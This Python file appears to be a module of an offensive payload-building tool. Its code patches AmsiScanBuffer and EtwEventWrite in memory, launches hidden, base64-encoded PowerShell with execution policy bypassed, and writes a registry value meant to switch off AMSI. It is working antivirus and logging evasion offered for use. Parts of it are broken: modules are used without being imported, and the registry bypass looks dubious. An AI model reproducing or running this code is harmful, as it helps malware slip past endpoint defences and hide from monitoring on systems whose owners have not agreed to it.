#~/Desktop/Chimera/PayloadBuilder/modules/amsi_bypass.py
"""
AMSI (Anti-Malware Scan Interface) Bypass Techniques
"""

import ctypes
import ctypes.wintypes

class AMSIBypass:
    """
    Various AMSI bypass techniques to prevent script scanning.
    """
    
    @staticmethod
    def patch_amsi():
        """
        Patch AmsiScanBuffer in memory to always return AMSI_RESULT_CLEAN.
        This prevents PowerShell and other scripts from being scanned.
        """
        try:
            # Find AmsiScanBuffer address
            amsi_dll = ctypes.WinDLL('amsi.dll')
            amsi_scan_buffer_addr = ctypes.cast(amsi_dll.AmsiScanBuffer, ctypes.c_void_p).value
            
            # Patch the function to return early (AMSI_RESULT_CLEAN = 0)
            # Different methods for x86 vs x64
            if ctypes.sizeof(ctypes.c_void_p) == 8:  # 64-bit
                # mov eax, 0; ret (x64)
                patch_bytes = bytes([0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3])
            else:  # 32-bit
                # xor eax, eax; ret (x86)
                patch_bytes = bytes([0x31, 0xC0, 0xC3])
            
            # Write the patch to memory (requires PAGE_EXECUTE_READWRITE)
            ctypes.windll.kernel32.VirtualProtect(
                amsi_scan_buffer_addr,
                len(patch_bytes),
                0x40,  # PAGE_EXECUTE_READWRITE
                ctypes.byref(ctypes.c_ulong())
            )
            ctypes.memmove(amsi_scan_buffer_addr, patch_bytes, len(patch_bytes))
            return True
        except Exception as e:
            print(f"AMSI patch failed: {e}")
            return False
    
    @staticmethod
    def patch_etw():
        """
        Patch ETW (Event Tracing for Windows) to suppress telemetry.
        """
        try:
            # Patch EtwEventWrite to return early
            ntdll = ctypes.WinDLL('ntdll.dll')
            etw_event_write_addr = ctypes.cast(ntdll.EtwEventWrite, ctypes.c_void_p).value
            
            # xor eax, eax; ret (x64) - return 0 (success)
            if ctypes.sizeof(ctypes.c_void_p) == 8:
                patch_bytes = bytes([0x31, 0xC0, 0xC3])
            else:
                patch_bytes = bytes([0x31, 0xC0, 0xC3])
            
            ctypes.windll.kernel32.VirtualProtect(
                etw_event_write_addr,
                len(patch_bytes),
                0x40,
                ctypes.byref(ctypes.c_ulong())
            )
            ctypes.memmove(etw_event_write_addr, patch_bytes, len(patch_bytes))
            return True
        except Exception as e:
            print(f"ETW patch failed: {e}")
            return False
    
    @staticmethod
    def execute_powershell_obfuscated(command):
        """
        Execute a PowerShell command with obfuscation to avoid detection.
        """
        # Encode command to bypass string scanning
        encoded = base64.b64encode(command.encode('utf-16le')).decode('ascii')
        cmd = f'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}'
        return subprocess.run(cmd, shell=True, capture_output=True, text=True)

    @staticmethod
    def bypass_amsi_registry():
        """
        Bypass AMSI by disabling it via registry (requires admin).
        """
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\AMSI\Providers",
                0,
                winreg.KEY_SET_VALUE
            )
            # This is a known AMSI bypass key
            winreg.SetValueEx(key, "DisableAntiMalware", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            return True
        except:
            return False
